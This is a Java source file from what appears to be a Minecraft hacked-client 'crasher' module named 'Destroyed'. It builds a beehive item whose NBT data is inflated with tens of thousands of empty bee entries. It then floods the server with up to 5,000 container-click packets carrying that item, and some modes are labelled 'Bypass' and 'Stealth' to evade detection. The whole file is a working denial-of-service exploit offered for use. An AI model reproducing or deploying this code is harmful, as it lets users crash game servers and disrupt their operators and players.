package us.whitedev.crashers.impl;

import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.MessageHelper;
import us.whitedev.utils.OptionUtil;
import us.whitedev.utils.OptionType;
import net.minecraft.client.Minecraft;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;

import java.util.ArrayList;
import java.util.List;

public class Destroyed extends Crasher {
    private final Minecraft mc = Minecraft.getInstance();
    private boolean enabled = false;
    private String mode = "Killer";

    public Destroyed() {
        super("Destroyed", "Multi-mode powerful NBT crash", true);
    }

    @Override
    public String getArgsUsage() { return "<mode>"; }

    @Override
    public List<OptionUtil> getOptions() {
        List<OptionUtil> options = new ArrayList<>();
        options.add(new OptionUtil("Mode", OptionType.LIST, new String[]{"Killer", "Bypass", "Strong", "Stealth", "Wassup"}));
        return options;
    }

    @Override
    public void applyOptions(String[] values) {
        if (values.length > 0) this.mode = values[0];
    }

    @Override
    public void onMethod(String[] args) {
        if (mc.player == null || mc.getConnection() == null || mc.player.containerMenu == null) {
            msgHelper.sendMessage("&cNot ready!", true);
            return;
        }

        int packets, size;
        switch (mode) {
            case "Killer" -> { packets = 5000; size = 35000; }
            case "Bypass" -> { packets = 500; size = 22000; }
            case "Strong" -> { packets = 2500; size = 32000; }
            case "Stealth" -> { packets = 300; size = 15000; }
            case "Wassup" -> { packets = 700; size = 27000; }
            default -> { packets = 1000; size = 25000; }
        }

        msgHelper.sendMessage("&fMode: &6" + mode + " &f| Packets: &6" + packets, true);

        ItemStack crashItem = getMainStack(size);
        for (int i = 0; i < packets; i++) {
            try {
                ServerboundContainerClickPacket packet = new ServerboundContainerClickPacket(
                    mc.player.containerMenu.containerId, 0, getValidSlot(), 0,
                    ClickType.PICKUP, crashItem, new it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap<>()
                );
                mc.getConnection().send(packet);
                if (mode.equals("Bypass") || mode.equals("Stealth")) {
                    Thread.sleep(1);
                }
            } catch (Exception e) { break; }
        }
        msgHelper.sendMessage("&aDestroyed completed!", true);
    }

    private ItemStack getMainStack(int size) {
        CompoundTag blockEntityTag = new CompoundTag();
        ListTag beesList = new ListTag();
        for (int i = 0; i < size; i++) beesList.add(new CompoundTag());
        blockEntityTag.put("Bees", beesList);
        CompoundTag beeHiveTag = new CompoundTag();
        beeHiveTag.put("BlockEntityTag", blockEntityTag);
        ItemStack stack = new ItemStack(Items.BEEHIVE);
        stack.setTag(beeHiveTag);
        return stack;
    }

    private int getValidSlot() {
        return mc.player.containerMenu.containerId == 0 ? 36 : 0;
    }

    @Override
    public boolean getEnabled() { return enabled; }

    @Override
    public void setEnabled(boolean bool) { this.enabled = bool; }
}
